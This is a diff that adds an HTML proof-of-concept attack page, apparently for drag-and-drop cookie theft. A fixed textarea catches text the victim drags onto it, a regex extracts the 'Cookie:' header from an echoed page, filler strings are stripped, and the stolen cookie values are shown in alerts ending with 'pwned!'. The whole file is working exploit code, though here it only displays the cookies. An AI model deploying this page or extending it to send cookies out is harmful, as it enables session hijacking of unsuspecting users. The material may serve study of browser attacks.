@@ -1,0 +1,29 @@
+<html>
+	<body>
+
+		<textarea align='center' style="position:fixed;top:30px" cols="50" rows="10" id="text" name="text" ondrop="getCookies(event)"></textarea>
+				
+		<script>
+
+			function getCookies(event) {
+					
+				event.preventDefault();
+				var cookies = event.dataTransfer.getData("Text");
+				
+				var re = /Cookie:.+<\/pre>/;
+				var value = re.exec(cookies);
+				
+				cookies = value[0].replace(/ABCD/g, "").replace(/abcd/g, "")
+				var aCookie = cookies.split(";")
+				
+				var msg = '';
+				for(i = 0; i < aCookie.length; i++)
+					msg += aCookie[i] + '\n';
+				
+				alert(msg);
+				alert('pwned!');
+			}
+			
+		</script>
+	</body>
+</html>
